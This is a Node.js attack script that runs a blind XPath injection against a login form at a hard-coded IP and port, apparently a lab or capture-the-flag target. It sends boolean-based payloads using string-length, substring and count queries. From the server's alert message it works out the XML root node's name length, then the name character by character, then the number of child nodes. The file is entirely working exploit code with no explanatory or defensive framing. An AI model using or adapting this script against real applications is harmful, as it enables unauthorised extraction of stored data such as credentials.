const axios = require('axios');
const cheerio = require('cheerio');

// Define the endpoint URL
const endpointUrl = 'http://94.237.53.3:56208/index.php';

// Function to determine the length of the root node's name
async function determineRootNodeLength() {
    let rootNodeNameLength = 1;
    let success = true;
    
    console.log(`🦑Exfiltrating Length Root Node's Name`)
    while (success) {
        try {
            
            // Modify the payload to check the length of the root node's name
            const payload = `username=invalid' or string-length(name(/*[1]))=${rootNodeNameLength} and '1'='1&msg=Hello`;
            let contentLength = payload.length
            //console.log(payload)
            // Define the request headers
            const headers = {
                'Host': '94.237.53.3:56208',
                'Content-Length': contentLength,
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'http://94.237.53.3:56208',
                'Content-Type': 'application/x-www-form-urlencoded',
            
            };
            // Make a POST request to the endpoint with the modified payload
            const response = await axios.post(endpointUrl, payload, { headers });
                // Load the HTML response into Cheerio
            const $ = cheerio.load(response.data);

            // Extract the content of the script tag
            const scriptContent = $('script').html();

            // Find and extract the value from the script tag
            const match = scriptContent.match(/alert\("(.*)"\);/);
            const result = match ? match[1] : null;
            //console.log("[-]",result)
            //Check if the response indicates success
            if (result.includes("Message successfully sent!")) {
                success = false;
                console.log("Length: ",rootNodeNameLength);
                determineRootNodeName(rootNodeNameLength)
                break;
             } 
        } catch (error) {
            console.error('Error:', error.message);
            break; // Exit the loop on error
        }

        // Increment the length for the next iteration
        rootNodeNameLength++;
    }
}

async function determineRootNodeName(rootNodeNameLength) {
    console.log(`🦑Exfiltrating Root Node's Name`)
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    let loading = ''
    let rootNodeName = ''

    for (let j = 1; j <= rootNodeNameLength; j++) {
        
        for (let i = 0; i < alphabet.length; i++) {
            const char = alphabet[i];
            try {
                
                // Modify the payload to check the root node's name
                const payload = `username=invalid' or substring(name(/*[1]),${j},1)='${char}'and '1'='1&msg=Hello`;
                let contentLength = payload.length
                //console.log(payload)
                // Define the request headers
                const headers = {
                    'Host': '94.237.53.3:56208',
                    'Content-Length': contentLength,
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'Origin': 'http://94.237.53.3:56208',
                    'Content-Type': 'application/x-www-form-urlencoded',
                
                };
                // Make a POST request to the endpoint with the modified payload
                const response = await axios.post(endpointUrl, payload, { headers });
                    // Load the HTML response into Cheerio
                const $ = cheerio.load(response.data);
    
                // Extract the content of the script tag
                const scriptContent = $('script').html();
    
                // Find and extract the value from the script tag
                const match = scriptContent.match(/alert\("(.*)"\);/);
                const result = match ? match[1] : null;
                //console.log("[-]",result)
                //Check if the response indicates success
                if (result.includes("Message successfully sent!")  || rootNodeNameLength <= rootNodeName.length) {
                    //loading += '😼'
                    rootNodeName += char
                    //console.log(loading);
                    //continue;
                 } 
                 if(rootNodeNameLength == rootNodeName.length) {
                    console.log(`Name: <${rootNodeName}>`);
                    determineNumberChildNode(rootNodeName)
                    break;
                 } 
            } catch (error) {
                console.error('Error:', error.message);
                break; // Exit the loop on error
            }
    
        }
    }
    
    
}

async function determineNumberChildNode(rootNodeName) {
    console.log(`🦑Exfiltrating the Number of Child Nodes`)
    let number = 1;
    let success = true;    
    while (success) {
        try {
            
            // Modify the payload to check the length of the root node's name
            const payload = `username=invalid' or count(/${rootNodeName}/*)=${number} and '1'='1&msg=Hello`;
            let contentLength = payload.length
            console.log(payload)
            // Define the request headers
            const headers = {
                'Host': '94.237.53.3:56208',
                'Content-Length': contentLength,
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'http://94.237.53.3:56208',
                'Content-Type': 'application/x-www-form-urlencoded',
            
            };
            // Make a POST request to the endpoint with the modified payload
            const response = await axios.post(endpointUrl, payload, { headers });
                // Load the HTML response into Cheerio
            const $ = cheerio.load(response.data);

            // Extract the content of the script tag
            const scriptContent = $('script').html();

            // Find and extract the value from the script tag
            const match = scriptContent.match(/alert\("(.*)"\);/);
            const result = match ? match[1] : null;
            console.log("[-]",result)
            //Check if the response indicates success
            if (result.includes("Message successfully sent!")) {
                success = false;
                console.log("Child nodes:", number);
                break;
             } 
        } catch (error) {
            console.error('Error:', error.message);
            break; // Exit the loop on error
        }

        // Increment the length for the next iteration
        number++;
    }
}
// Call the determineRootNodeLength function
determineRootNodeLength();
